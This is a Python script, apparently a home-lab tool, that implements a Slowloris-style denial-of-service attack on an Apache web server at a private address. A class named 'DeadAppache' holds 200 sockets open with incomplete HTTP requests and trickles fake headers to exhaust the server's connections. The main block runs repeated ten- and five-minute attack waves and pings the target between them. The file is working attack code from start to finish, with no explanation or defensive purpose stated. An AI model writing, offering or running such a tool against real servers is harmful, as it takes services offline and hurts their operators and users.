import threading

import requests
import socket
import random
import time
import sys
import os


def get_dos():
    url_list = ['http://192.168.1.160']
    count = [1,2,3,4,5,6,7,8,9,10]
    for c in count:
        response = requests.get(url='http://192.168.1.93')
        # requests.get(url='http://192.168.1.160/')
        if response.status_code == 200:
            print('Success!')
            print('Success')
        elif response.status_code == 404:
            print('Not Found.')



class DeadAppache():
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        self._headers = [
            # "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.newSocket()

    def attack_service(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        while (time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    # s.bind(address=self._ip)
                    s.send(self.getMessage("X-a: "))
                    # requests.get(url=self._ip)
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))


if __name__ == "__main__":
    count = [0,1,2,3,4,5,6,7,8,9]
    for c in count:

        kill = DeadAppache(ip="192.168.1.160", port=80, socketsCount=200)
        f_attack = kill.attack_service(timeout=60 * 10)


        dos = DeadAppache(ip="192.168.1.160", port=80, socketsCount=200)
        dos.attack_service(timeout=60*10)
        print('1ST DOS BACH EXECUTED')
        dos.attack_service(timeout=60 * 5)
        print('2ND DOS BACH EXECUTED')
        os.system("ping 192.168.1.160")
        dos.attack_service(timeout=60 * 5)
        print('3RD DOS BACH EXECUTED')
        dos.attack_service(timeout=60 * 10)
        print('4TH DOS BACH EXECUTED')
        print('---------------------------------------------------')
        print('ALL DOS BACH EXECUTED')
        # get_dos()
